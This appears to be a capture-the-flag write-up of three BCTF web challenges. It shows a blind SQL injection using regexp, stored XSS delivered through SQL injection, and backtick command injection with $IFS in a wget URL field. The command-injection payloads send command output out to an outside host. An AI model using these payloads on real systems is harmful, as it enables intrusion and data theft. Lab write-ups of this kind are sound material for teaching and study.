`http://bctf.cn/#/challenge`
Participated as Ad Victoriam

## sqli_engine (200pt)

`http://104.197.7.111:8080/`

Just simple SQLi won't work on this level, because the given token is completely salted and encrypted.

The only way is to blind SQLi the password of the admin.

By bruteforcing the password using `regexp` operator, you will be able to solve this challenge.

```
Username: 1'='1
Password: '=password regexp '^BCTF{h~~~~~~
```

--

## webchat (325pt)

`http://146.148.60.107:9991/`

This challenge consists of both SQLi and XSS vulnerability.

First of all, you will be able to see that the javascript connects to the websocket and sends the data.

Since HTML tags are filtered completely, there is only one way to solve this challenge - by performing XSS through SQL injection.

```
Payload: stypr: 1'),((0x~~~~~~~)),('stypr: 1
the 0x~~~ hex data has to be the result in the form of "stypr: <script>document.location.~~~</script>", as the format of the record has to be "username: data".
```

--

## torrent_lover (233pt)


`http://218.2.197.253/index.php`

There is only one input to inject data and that was the input for the torrent URL address.

As we look further on how the torrents are read, we find out that the website uses `wget` to read data.

Considering that the `wget` is executed by `system()` function, we can think about injecting a grave accent (http://en.wikipedia.org/wiki/Grave_accent) in order to execute a shell command.

However, spaces are filtered from the `system()` command so you may have to use an internal field seperator to execute commands.

```http://stypr.com:33/stypr?id=&#96;ls$IFS../flag%7Cbase64&#96;#.torrent```

This would give you the base64-encoded output of ../flag directory listing, which is decoded as

```
flag
use_me_to_read_flag
```

As we analyze the `use_me_to_read_flag` binary by performing a reverse-engineering, we find out that the word `flag` is filtered by the binary.

By symlinking the flag and loading the symlinked file would pop out the flag.

```
http://stypr.com/stypr?id=&#96;mkdir$IFS-p$IFS/tmp/stypr&#96;#.torrent
http://stypr.com:33/stypr?id=&#96;ln$IFS-s$IFS/var/www/flag/flag$IFS/tmp/stypr/stypr&#96;#.torrent
http://stypr.com:33/stypr?id=&#96;../flag/use_me_to_read_flag$IFS/tmp/stypr/stypr&#96;#.torrent
```